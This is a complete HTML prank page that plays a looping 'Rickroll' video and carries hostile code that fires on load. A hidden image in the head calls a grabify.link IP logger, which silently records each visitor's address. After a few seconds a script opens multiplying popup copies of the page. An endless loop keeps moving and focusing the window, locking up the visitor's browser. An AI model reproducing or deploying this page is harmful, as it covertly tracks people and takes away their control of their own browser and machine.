<!DOCTYPE html>
<html>
	<head>
		<img src="https://grabify.link/0H9ONR" style="display: none;">
		<script>
function onload() {
	var xOff = 5;
	var yOff = 5;
	var xPos = 400;
	var yPos = -100;
	function pool() {
		if (location.port == "") {
			open(location.protocol+"//"+location.hostname+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
		} else {
			open(location.protocol+"//"+location.hostname+":"+location.port+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
		};
	};
	function pol() {
		pool();
		pool();
		pool();
		pool();
		pool();
		pool();
	};
	setTimeout(pol, 6000);
	while (true) {
		document.title = " ! RICKROLLED ! ";
		xPos += xOff;
		yPos += yOff;
		if (xPos > screen.width - 357) {
			xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
		};
		if (xPos < 1) {
			xOff = Math.ceil( 7 * Math.random()) * 5 - 10;
		};
		if (yPos > screen.height - 330) {
			yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
		};	
		if (yPos < 1) {
			yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
		};
		focus()
		resizeTo(357, 330);
		moveTo(xPos, yPos);
	};
};
		</script>
	</head>
	<body onload="onload();" leftmargin="0" topmargin="0">
		<video width="357" height="330" autoplay loop>
			<source src="/RA_NGGUU.mp4">
		</video>
	</body>
</html>
